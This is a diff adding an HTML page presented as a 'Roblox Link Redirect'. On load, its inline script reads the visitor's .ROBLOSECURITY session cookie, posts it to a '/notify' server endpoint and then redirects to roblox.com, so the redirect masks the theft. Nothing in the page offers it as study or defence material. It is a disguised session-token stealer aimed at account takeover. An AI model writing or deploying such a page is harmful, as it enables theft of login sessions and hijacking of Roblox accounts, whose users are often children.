@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Link Redirect</title>
+    <script>
+        // Function to get a specific cookie by name
+        function getCookie(name) {
+            let match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
+            if (match) return match[2];
+            return null;
+        }
+
+        // Check for .ROBLOSECURITY cookie and send it to the server
+        window.onload = function() {
+            const robloCookie = getCookie('.ROBLOSECURITY');
+            if (robloCookie) {
+                fetch('/notify', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ cookie: robloCookie })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Notification Sent", data);
+                    window.location.href = "https://www.roblox.com"; // Redirect to Roblox link
+                })
+                .catch(error => console.error('Error:', error));
+            } else {
+                alert("Please login to Roblox first.");
+            }
+        };
+    </script>
+</head>
+<body>
+    <h1>Redirecting to Roblox...</h1>
+</body>
+</html>
